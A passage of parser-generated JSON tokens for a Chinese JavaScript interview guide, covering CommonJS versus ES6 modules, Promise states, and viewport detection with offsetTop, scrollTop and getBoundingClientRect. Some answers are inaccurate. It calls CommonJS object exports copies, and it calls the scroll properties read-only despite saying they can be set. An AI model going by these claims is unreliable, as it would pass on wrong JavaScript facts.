CommonJS和ES6模块的区别？\\n\\n","depth":2,"text":"22. CommonJS和ES6模块的区别？","tokens":[{"type":"text","raw":"22. CommonJS和ES6模块的区别？","text":"22. CommonJS和ES6模块的区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- CommonJS模块是同步加载的，ES6模块是异步加载的。\\n\\n- CommonJS模块的导出是值的拷贝，ES6模块的导出是值的引用。\\n\\n- CommonJS模块的导入是动态的，ES6模块的导入是静态的。\\n\\n- CommonJS模块的导出是函数时，导出的函数是值的拷贝，ES6模块的导出是函数时，导出的函数是值的引用。\\n\\n- CommonJS模块的导出是对象时，导出的对象是值的拷贝，ES6模块的导出是对象时，导出的对象是值的引用。\\n\\n- CommonJS模块的导出是类时，导出的类是值的拷贝，ES6模块的导出是类时，导出的类是值的引用。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- CommonJS模块是同步加载的，ES6模块是异步加载的。\\n\\n","task":false,"loose":true,"text":"CommonJS模块是同步加载的，ES6模块是异步加载的。\\n","tokens":[{"type":"text","raw":"CommonJS模块是同步加载的，ES6模块是异步加载的。\\n","text":"CommonJS模块是同步加载的，ES6模块是异步加载的。","tokens":[{"type":"text","raw":"CommonJS模块是同步加载的，ES6模块是异步加载的。","text":"CommonJS模块是同步加载的，ES6模块是异步加载的。","escaped":false}]}]},{"type":"list_item","raw":"- CommonJS模块的导出是值的拷贝，ES6模块的导出是值的引用。\\n\\n","task":false,"loose":true,"text":"CommonJS模块的导出是值的拷贝，ES6模块的导出是值的引用。\\n","tokens":[{"type":"text","raw":"CommonJS模块的导出是值的拷贝，ES6模块的导出是值的引用。\\n","text":"CommonJS模块的导出是值的拷贝，ES6模块的导出是值的引用。","tokens":[{"type":"text","raw":"CommonJS模块的导出是值的拷贝，ES6模块的导出是值的引用。","text":"CommonJS模块的导出是值的拷贝，ES6模块的导出是值的引用。","escaped":false}]}]},{"type":"list_item","raw":"- CommonJS模块的导入是动态的，ES6模块的导入是静态的。\\n\\n","task":false,"loose":true,"text":"CommonJS模块的导入是动态的，ES6模块的导入是静态的。\\n","tokens":[{"type":"text","raw":"CommonJS模块的导入是动态的，ES6模块的导入是静态的。\\n","text":"CommonJS模块的导入是动态的，ES6模块的导入是静态的。","tokens":[{"type":"text","raw":"CommonJS模块的导入是动态的，ES6模块的导入是静态的。","text":"CommonJS模块的导入是动态的，ES6模块的导入是静态的。","escaped":false}]}]},{"type":"list_item","raw":"- CommonJS模块的导出是函数时，导出的函数是值的拷贝，ES6模块的导出是函数时，导出的函数是值的引用。\\n\\n","task":false,"loose":true,"text":"CommonJS模块的导出是函数时，导出的函数是值的拷贝，ES6模块的导出是函数时，导出的函数是值的引用。\\n","tokens":[{"type":"text","raw":"CommonJS模块的导出是函数时，导出的函数是值的拷贝，ES6模块的导出是函数时，导出的函数是值的引用。\\n","text":"CommonJS模块的导出是函数时，导出的函数是值的拷贝，ES6模块的导出是函数时，导出的函数是值的引用。","tokens":[{"type":"text","raw":"CommonJS模块的导出是函数时，导出的函数是值的拷贝，ES6模块的导出是函数时，导出的函数是值的引用。","text":"CommonJS模块的导出是函数时，导出的函数是值的拷贝，ES6模块的导出是函数时，导出的函数是值的引用。","escaped":false}]}]},{"type":"list_item","raw":"- CommonJS模块的导出是对象时，导出的对象是值的拷贝，ES6模块的导出是对象时，导出的对象是值的引用。\\n\\n","task":false,"loose":true,"text":"CommonJS模块的导出是对象时，导出的对象是值的拷贝，ES6模块的导出是对象时，导出的对象是值的引用。\\n","tokens":[{"type":"text","raw":"CommonJS模块的导出是对象时，导出的对象是值的拷贝，ES6模块的导出是对象时，导出的对象是值的引用。\\n","text":"CommonJS模块的导出是对象时，导出的对象是值的拷贝，ES6模块的导出是对象时，导出的对象是值的引用。","tokens":[{"type":"text","raw":"CommonJS模块的导出是对象时，导出的对象是值的拷贝，ES6模块的导出是对象时，导出的对象是值的引用。","text":"CommonJS模块的导出是对象时，导出的对象是值的拷贝，ES6模块的导出是对象时，导出的对象是值的引用。","escaped":false}]}]},{"type":"list_item","raw":"- CommonJS模块的导出是类时，导出的类是值的拷贝，ES6模块的导出是类时，导出的类是值的引用。","task":false,"loose":true,"text":"CommonJS模块的导出是类时，导出的类是值的拷贝，ES6模块的导出是类时，导出的类是值的引用。","tokens":[{"type":"text","raw":"CommonJS模块的导出是类时，导出的类是值的拷贝，ES6模块的导出是类时，导出的类是值的引用。","text":"CommonJS模块的导出是类时，导出的类是值的拷贝，ES6模块的导出是类时，导出的类是值的引用。","tokens":[{"type":"text","raw":"CommonJS模块的导出是类时，导出的类是值的拷贝，ES6模块的导出是类时，导出的类是值的引用。","text":"CommonJS模块的导出是类时，导出的类是值的拷贝，ES6模块的导出是类时，导出的类是值的引用。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 23. 介绍一下Promise\\n\\n","depth":2,"text":"23. 介绍一下Promise","tokens":[{"type":"text","raw":"23. 介绍一下Promise","text":"23. 介绍一下Promise","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"Promise 是一种用于处理异步操作的 JavaScript 对象。它代表了一个尚未完成但预期将来会完成的操作的结果。","text":"Promise 是一种用于处理异步操作的 JavaScript 对象。它代表了一个尚未完成但预期将来会完成的操作的结果。","tokens":[{"type":"text","raw":"Promise 是一种用于处理异步操作的 JavaScript 对象。它代表了一个尚未完成但预期将来会完成的操作的结果。","text":"Promise 是一种用于处理异步操作的 JavaScript 对象。它代表了一个尚未完成但预期将来会完成的操作的结果。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"Promise 对象有三种状态：","text":"Promise 对象有三种状态：","tokens":[{"type":"text","raw":"Promise 对象有三种状态：","text":"Promise 对象有三种状态：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- Pending（进行中）：初始状态，既不是成功，也不是失败状态。\\n\\n- Fulfilled（已成功）：意味着操作成功完成。\\n\\n- Rejected（已失败）：意味着操作失败。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- Pending（进行中）：初始状态，既不是成功，也不是失败状态。\\n\\n","task":false,"loose":true,"text":"Pending（进行中）：初始状态，既不是成功，也不是失败状态。\\n","tokens":[{"type":"text","raw":"Pending（进行中）：初始状态，既不是成功，也不是失败状态。\\n","text":"Pending（进行中）：初始状态，既不是成功，也不是失败状态。","tokens":[{"type":"text","raw":"Pending（进行中）：初始状态，既不是成功，也不是失败状态。","text":"Pending（进行中）：初始状态，既不是成功，也不是失败状态。","escaped":false}]}]},{"type":"list_item","raw":"- Fulfilled（已成功）：意味着操作成功完成。\\n\\n","task":false,"loose":true,"text":"Fulfilled（已成功）：意味着操作成功完成。\\n","tokens":[{"type":"text","raw":"Fulfilled（已成功）：意味着操作成功完成。\\n","text":"Fulfilled（已成功）：意味着操作成功完成。","tokens":[{"type":"text","raw":"Fulfilled（已成功）：意味着操作成功完成。","text":"Fulfilled（已成功）：意味着操作成功完成。","escaped":false}]}]},{"type":"list_item","raw":"- Rejected（已失败）：意味着操作失败。","task":false,"loose":true,"text":"Rejected（已失败）：意味着操作失败。","tokens":[{"type":"text","raw":"Rejected（已失败）：意味着操作失败。","text":"Rejected（已失败）：意味着操作失败。","tokens":[{"type":"text","raw":"Rejected（已失败）：意味着操作失败。","text":"Rejected（已失败）：意味着操作失败。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"Promise 对象使用 `then` 方法来处理成功和失败的情况。`then` 方法接受两个参数：一个用于处理成功情况的回调函数和一个用于处理失败情况的回调函数。","text":"Promise 对象使用 `then` 方法来处理成功和失败的情况。`then` 方法接受两个参数：一个用于处理成功情况的回调函数和一个用于处理失败情况的回调函数。","tokens":[{"type":"text","raw":"Promise 对象使用 ","text":"Promise 对象使用 ","escaped":false},{"type":"codespan","raw":"`then`","text":"then"},{"type":"text","raw":" 方法来处理成功和失败的情况。","text":" 方法来处理成功和失败的情况。","escaped":false},{"type":"codespan","raw":"`then`","text":"then"},{"type":"text","raw":" 方法接受两个参数：一个用于处理成功情况的回调函数和一个用于处理失败情况的回调函数。","text":" 方法接受两个参数：一个用于处理成功情况的回调函数和一个用于处理失败情况的回调函数。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nconst promise = new Promise((resolve, reject) => {\\n\\n\\n})\\n\\n```","lang":"js","text":"const promise = new Promise((resolve, reject) => {\\n\\n\\n})\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 24. 如何判断一个元素是否在可视区域内？\\n\\n","depth":2,"text":"24. 如何判断一个元素是否在可视区域内？","tokens":[{"type":"text","raw":"24. 如何判断一个元素是否在可视区域内？","text":"24. 如何判断一个元素是否在可视区域内？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **1：用途**","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：用途**","task":false,"loose":false,"text":"**1：用途**","tokens":[{"type":"text","raw":"**1：用途**","text":"**1：用途**","tokens":[{"type":"strong","raw":"**1：用途**","text":"1：用途","tokens":[{"type":"text","raw":"1：用途","text":"1：用途","escaped":false}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"可视区域即我们浏览网页的设备肉眼可见的区域，如下图","text":"可视区域即我们浏览网页的设备肉眼可见的区域，如下图","tokens":[{"type":"text","raw":"可视区域即我们浏览网页的设备肉眼可见的区域，如下图","text":"可视区域即我们浏览网页的设备肉眼可见的区域，如下图","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"![](/public/images/3_JavaScript_20241230001543.png)","text":"![](/public/images/3_JavaScript_20241230001543.png)","tokens":[{"type":"image","raw":"![](/public/images/3_JavaScript_20241230001543.png)","href":"/public/images/3_JavaScript_20241230001543.png","title":null,"text":""}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"在日常开发中，我们经常需要判断目标元素是否在视窗之内或者和视窗的距离小于一个值（例如 100 px），从而实现一些常用的功能，例如：","text":"在日常开发中，我们经常需要判断目标元素是否在视窗之内或者和视窗的距离小于一个值（例如 100 px），从而实现一些常用的功能，例如：","tokens":[{"type":"text","raw":"在日常开发中，我们经常需要判断目标元素是否在视窗之内或者和视窗的距离小于一个值（例如 100 px），从而实现一些常用的功能，例如：","text":"在日常开发中，我们经常需要判断目标元素是否在视窗之内或者和视窗的距离小于一个值（例如 100 px），从而实现一些常用的功能，例如：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"blockquote","raw":"> - 图片的懒加载\\n> - 列表的无限滚动\\n> - 计算广告元素的曝光情况\\n> - 可点击链接的预加载","tokens":[{"type":"list","raw":"- 图片的懒加载\\n- 列表的无限滚动\\n- 计算广告元素的曝光情况\\n- 可点击链接的预加载","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 图片的懒加载\\n","task":false,"loose":false,"text":"图片的懒加载","tokens":[{"type":"text","raw":"图片的懒加载","text":"图片的懒加载","tokens":[{"type":"text","raw":"图片的懒加载","text":"图片的懒加载","escaped":false}]}]},{"type":"list_item","raw":"- 列表的无限滚动\\n","task":false,"loose":false,"text":"列表的无限滚动","tokens":[{"type":"text","raw":"列表的无限滚动","text":"列表的无限滚动","tokens":[{"type":"text","raw":"列表的无限滚动","text":"列表的无限滚动","escaped":false}]}]},{"type":"list_item","raw":"- 计算广告元素的曝光情况\\n","task":false,"loose":false,"text":"计算广告元素的曝光情况","tokens":[{"type":"text","raw":"计算广告元素的曝光情况","text":"计算广告元素的曝光情况","tokens":[{"type":"text","raw":"计算广告元素的曝光情况","text":"计算广告元素的曝光情况","escaped":false}]}]},{"type":"list_item","raw":"- 可点击链接的预加载","task":false,"loose":false,"text":"可点击链接的预加载","tokens":[{"type":"text","raw":"可点击链接的预加载","text":"可点击链接的预加载","tokens":[{"type":"text","raw":"可点击链接的预加载","text":"可点击链接的预加载","escaped":false}]}]}]}],"text":"- 图片的懒加载\\n- 列表的无限滚动\\n- 计算广告元素的曝光情况\\n- 可点击链接的预加载"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **实现方式: 3**","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **实现方式: 3**","task":false,"loose":false,"text":"**实现方式: 3**","tokens":[{"type":"text","raw":"**实现方式: 3**","text":"**实现方式: 3**","tokens":[{"type":"strong","raw":"**实现方式: 3**","text":"实现方式: 3","tokens":[{"type":"text","raw":"实现方式: 3","text":"实现方式: 3","escaped":false}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"##### 1）offsetTop、scrollTop\\n\\n","depth":5,"text":"1）offsetTop、scrollTop","tokens":[{"type":"text","raw":"1）offsetTop、scrollTop","text":"1）offsetTop、scrollTop","escaped":false}]},{"type":"paragraph","raw":"`offsetTop`，元素的上外边框至包含元素的上内边框之间的像素距离，其他`offset`属性如下图所示：","text":"`offsetTop`，元素的上外边框至包含元素的上内边框之间的像素距离，其他`offset`属性如下图所示：","tokens":[{"type":"codespan","raw":"`offsetTop`","text":"offsetTop"},{"type":"text","raw":"，元素的上外边框至包含元素的上内边框之间的像素距离，其他","text":"，元素的上外边框至包含元素的上内边框之间的像素距离，其他","escaped":false},{"type":"codespan","raw":"`offset`","text":"offset"},{"type":"text","raw":"属性如下图所示：","text":"属性如下图所示：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"![](/public/images/3_JavaScript_20241230001827.png)","text":"![](/public/images/3_JavaScript_20241230001827.png)","tokens":[{"type":"image","raw":"![](/public/images/3_JavaScript_20241230001827.png)","href":"/public/images/3_JavaScript_20241230001827.png","title":null,"text":""}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"下面再来了解下`clientWidth`、`clientHeight`：","text":"下面再来了解下`clientWidth`、`clientHeight`：","tokens":[{"type":"text","raw":"下面再来了解下","text":"下面再来了解下","escaped":false},{"type":"codespan","raw":"`clientWidth`","text":"clientWidth"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`clientHeight`","text":"clientHeight"},{"type":"text","raw":"：","text":"：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- `clientWidth`：元素内容区宽度加上左右内边距宽度，即`clientWidth = content + padding`\\n- `clientHeight`：元素内容区高度加上上下内边距高度，即`clientHeight = content + padding`","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- `clientWidth`：元素内容区宽度加上左右内边距宽度，即`clientWidth = content + padding`\\n","task":false,"loose":false,"text":"`clientWidth`：元素内容区宽度加上左右内边距宽度，即`clientWidth = content + padding`","tokens":[{"type":"text","raw":"`clientWidth`：元素内容区宽度加上左右内边距宽度，即`clientWidth = content + padding`","text":"`clientWidth`：元素内容区宽度加上左右内边距宽度，即`clientWidth = content + padding`","tokens":[{"type":"codespan","raw":"`clientWidth`","text":"clientWidth"},{"type":"text","raw":"：元素内容区宽度加上左右内边距宽度，即","text":"：元素内容区宽度加上左右内边距宽度，即","escaped":false},{"type":"codespan","raw":"`clientWidth = content + padding`","text":"clientWidth = content + padding"}]}]},{"type":"list_item","raw":"- `clientHeight`：元素内容区高度加上上下内边距高度，即`clientHeight = content + padding`","task":false,"loose":false,"text":"`clientHeight`：元素内容区高度加上上下内边距高度，即`clientHeight = content + padding`","tokens":[{"type":"text","raw":"`clientHeight`：元素内容区高度加上上下内边距高度，即`clientHeight = content + padding`","text":"`clientHeight`：元素内容区高度加上上下内边距高度，即`clientHeight = content + padding`","tokens":[{"type":"codespan","raw":"`clientHeight`","text":"clientHeight"},{"type":"text","raw":"：元素内容区高度加上上下内边距高度，即","text":"：元素内容区高度加上上下内边距高度，即","escaped":false},{"type":"codespan","raw":"`clientHeight = content + padding`","text":"clientHeight = content + padding"}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"这里可以看到`client`元素都不包括外边距","text":"这里可以看到`client`元素都不包括外边距","tokens":[{"type":"text","raw":"这里可以看到","text":"这里可以看到","escaped":false},{"type":"codespan","raw":"`client`","text":"client"},{"type":"text","raw":"元素都不包括外边距","text":"元素都不包括外边距","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"最后，关于`scroll`系列的属性如下：","text":"最后，关于`scroll`系列的属性如下：","tokens":[{"type":"text","raw":"最后，关于","text":"最后，关于","escaped":false},{"type":"codespan","raw":"`scroll`","text":"scroll"},{"type":"text","raw":"系列的属性如下：","text":"系列的属性如下：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- `scrollWidth` 和 `scrollHeight` 主要用于确定元素内容的实际大小\\n\\n- `scrollLeft` 和 `scrollTop` 属性既可以确定元素当前滚动的状态，也可以设置元素的滚动位置\\n\\n- 垂直滚动 `scrollTop > 0`\\n\\n- 水平滚动 `scrollLeft > 0`\\n\\n- 将元素的 `scrollLeft` 和 `scrollTop` 设置为 0，可以重置元素的滚动位置","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- `scrollWidth` 和 `scrollHeight` 主要用于确定元素内容的实际大小\\n\\n","task":false,"loose":true,"text":"`scrollWidth` 和 `scrollHeight` 主要用于确定元素内容的实际大小\\n","tokens":[{"type":"text","raw":"`scrollWidth` 和 `scrollHeight` 主要用于确定元素内容的实际大小\\n","text":"`scrollWidth` 和 `scrollHeight` 主要用于确定元素内容的实际大小","tokens":[{"type":"codespan","raw":"`scrollWidth`","text":"scrollWidth"},{"type":"text","raw":" 和 ","text":" 和 ","escaped":false},{"type":"codespan","raw":"`scrollHeight`","text":"scrollHeight"},{"type":"text","raw":" 主要用于确定元素内容的实际大小","text":" 主要用于确定元素内容的实际大小","escaped":false}]}]},{"type":"list_item","raw":"- `scrollLeft` 和 `scrollTop` 属性既可以确定元素当前滚动的状态，也可以设置元素的滚动位置\\n\\n","task":false,"loose":true,"text":"`scrollLeft` 和 `scrollTop` 属性既可以确定元素当前滚动的状态，也可以设置元素的滚动位置\\n","tokens":[{"type":"text","raw":"`scrollLeft` 和 `scrollTop` 属性既可以确定元素当前滚动的状态，也可以设置元素的滚动位置\\n","text":"`scrollLeft` 和 `scrollTop` 属性既可以确定元素当前滚动的状态，也可以设置元素的滚动位置","tokens":[{"type":"codespan","raw":"`scrollLeft`","text":"scrollLeft"},{"type":"text","raw":" 和 ","text":" 和 ","escaped":false},{"type":"codespan","raw":"`scrollTop`","text":"scrollTop"},{"type":"text","raw":" 属性既可以确定元素当前滚动的状态，也可以设置元素的滚动位置","text":" 属性既可以确定元素当前滚动的状态，也可以设置元素的滚动位置","escaped":false}]}]},{"type":"list_item","raw":"- 垂直滚动 `scrollTop > 0`\\n\\n","task":false,"loose":true,"text":"垂直滚动 `scrollTop > 0`\\n","tokens":[{"type":"text","raw":"垂直滚动 `scrollTop > 0`\\n","text":"垂直滚动 `scrollTop > 0`","tokens":[{"type":"text","raw":"垂直滚动 ","text":"垂直滚动 ","escaped":false},{"type":"codespan","raw":"`scrollTop > 0`","text":"scrollTop > 0"}]}]},{"type":"list_item","raw":"- 水平滚动 `scrollLeft > 0`\\n\\n","task":false,"loose":true,"text":"水平滚动 `scrollLeft > 0`\\n","tokens":[{"type":"text","raw":"水平滚动 `scrollLeft > 0`\\n","text":"水平滚动 `scrollLeft > 0`","tokens":[{"type":"text","raw":"水平滚动 ","text":"水平滚动 ","escaped":false},{"type":"codespan","raw":"`scrollLeft > 0`","text":"scrollLeft > 0"}]}]},{"type":"list_item","raw":"- 将元素的 `scrollLeft` 和 `scrollTop` 设置为 0，可以重置元素的滚动位置","task":false,"loose":true,"text":"将元素的 `scrollLeft` 和 `scrollTop` 设置为 0，可以重置元素的滚动位置","tokens":[{"type":"text","raw":"将元素的 `scrollLeft` 和 `scrollTop` 设置为 0，可以重置元素的滚动位置","text":"将元素的 `scrollLeft` 和 `scrollTop` 设置为 0，可以重置元素的滚动位置","tokens":[{"type":"text","raw":"将元素的 ","text":"将元素的 ","escaped":false},{"type":"codespan","raw":"`scrollLeft`","text":"scrollLeft"},{"type":"text","raw":" 和 ","text":" 和 ","escaped":false},{"type":"codespan","raw":"`scrollTop`","text":"scrollTop"},{"type":"text","raw":" 设置为 0，可以重置元素的滚动位置","text":" 设置为 0，可以重置元素的滚动位置","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"##### 注意\\n\\n","depth":5,"text":"注意","tokens":[{"type":"text","raw":"注意","text":"注意","escaped":false}]},{"type":"list","raw":"- 上述属性都是只读的，每次访问都要重新开始","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 上述属性都是只读的，每次访问都要重新开始","task":false,"loose":false,"text":"上述属性都是只读的，每次访问都要重新开始","tokens":[{"type":"text","raw":"上述属性都是只读的，每次访问都要重新开始","text":"上述属性都是只读的，每次访问都要重新开始","tokens":[{"type":"text","raw":"上述属性都是只读的，每次访问都要重新开始","text":"上述属性都是只读的，每次访问都要重新开始","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"下面再看看如何实现判断：","text":"下面再看看如何实现判断：","tokens":[{"type":"text","raw":"下面再看看如何实现判断：","text":"下面再看看如何实现判断：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"公式如下：","text":"公式如下：","tokens":[{"type":"text","raw":"公式如下：","text":"公式如下：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nel.offsetTop - document.documentElement.scrollTop <= viewPortHeight\\n```","lang":"js","text":"el.offsetTop - document.documentElement.scrollTop <= viewPortHeight"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"代码实现：","text":"代码实现：","tokens":[{"type":"text","raw":"代码实现：","text":"代码实现：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nfunction isInViewPortOfOne (el) {\\n    // viewPortHeight 兼容所有浏览器写法\\n    const viewPortHeight = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight \\n    const offsetTop = el.offsetTop\\n    const scrollTop = document.documentElement.scrollTop\\n    const top = offsetTop - scrollTop\\n    return top <= viewPortHeight\\n}\\n```","lang":"js","text":"function isInViewPortOfOne (el) {\\n    // viewPortHeight 兼容所有浏览器写法\\n    const viewPortHeight = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight \\n    const offsetTop = el.offsetTop\\n    const scrollTop = document.documentElement.scrollTop\\n    const top = offsetTop - scrollTop\\n    return top <= viewPortHeight\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"##### 2）getBoundingClientRect\\n\\n","depth":5,"text":"2）getBoundingClientRect","tokens":[{"type":"text","raw":"2）getBoundingClientRect","text":"2）getBoundingClientRect","escaped":false}]},{"type":"paragraph","raw":"返回值是一个 `DOMRect`对象，拥有`left`, `top`, `right`, `bottom`, `x`, `y`, `width`, 和 `height`属性","text":"返回值是一个 `DOMRect`对象，拥有`left`, `top`, `right`, `bottom`, `x`, `y`, `width`, 和 `height`属性","tokens":[{"type":"text","raw":"返回值是一个 ","text":"返回值是一个 ","escaped":false},{"type":"codespan","raw":"`DOMRect`","text":"DOMRect"},{"type":"text","raw":"对象，拥有","text":"对象，拥有","escaped":false},{"type":"codespan","raw":"`left`","text":"left"},{"type":"text","raw":", ","text":", ","escaped":false},{"type":"codespan","raw":"`top`","text":"top"},{"type":"text","raw":", ","text":", ","escaped":false},{"type":"codespan","raw":"`right`","text":"right"},{"type":"text","raw":", ","text":", ","escaped":false},{"type":"codespan","raw":"`bottom`","text":"bottom"},{"type":"text","raw":", ","text":", ","escaped":false},{"type":"codespan","raw":"`x`","text":"x"},{"type":"text","raw":", ","text":", ","escaped":false},{"type":"codespan","raw":"`y`","text":"y"},{"type":"text","raw":", ","text":", ","escaped":false},{"type":"codespan","raw":"`width`","text":"width"},{"type":"text","raw":", 和 ","text":", 和 ","escaped":false},{"type":"codespan","raw":"`height`","text":"height"},{"type":"text","raw":"属性","text":"属性","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nconst target = document.querySelector(\'.target\');\\nconst clientRect = target.getBoundingClientRect();\\nconsole.log(clientRect);\\n\\n// {\\n//   bottom: 556.21875,\\n//   height: 393.59375,\\n//   left: 333,\\n//   right: 1017,\\n//   top: 162.625,\\n//   width: 684\\n// }\\n```","lang":"js","text":"const target = document.querySelector(\'.target\');\\nconst clientRect = target.getBoundingClientRect();\\nconsole.log(clientRect);\\n\\n// {\\n//   bottom: 556.21875,\\n//   height: 393.59375,\\n//   left: 333,\\n//   right: 1017,\\n//   top: 162.625,\\n//   width: 684\\n// }"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"属性对应的关系图如下所示：","text":"属性对应的关系图如下所示：","tokens":[{"type":"text","raw":"属性对应的关系图如下所示：","text":"属性对应的关系图如下所示：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"![](/public/images/3_JavaScript_20241230002050.png)","text":"![](/public/images/3_JavaScript_20241230002050.png)","tokens":[{"type":"image","raw":"![](/public/images/3_JavaScript_20241230002050.png)","href":"/public/images/3_JavaScript_20241230002050.png","title":null,"text":""}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"当页面发生滚动的时候，`top`与`left`属性值都会随之改变","text":"当页面发生滚动的时候，`top`与`left`属性值都会随之改变","tokens":[{"type":"text","raw":"当页面发生滚动的时候，","text":"当页面发生滚动的时候，","escaped":false},{"type":"codespan","raw":"`top`","text":"top"},{"type":"text","raw":"与","text":"与","escaped":false},{"type":"codespan","raw":"`left`","text":"left"},{"type":"text","raw":"属性值都会随之改变","text":"属性值都会随之改变","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"如果一个元素在视窗之内的话，那么它一定满足下面四个条件：","text":"如果一个元素在视窗之内的话，那么它一定满足下面四个条件：","tokens":[{"type":"text","raw":"如果一个元素在视窗之内的话，那么它一定满足下面四个条件：","text":"如果一个元素在视窗之内的话，那么它一定满足下面四个条件：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"t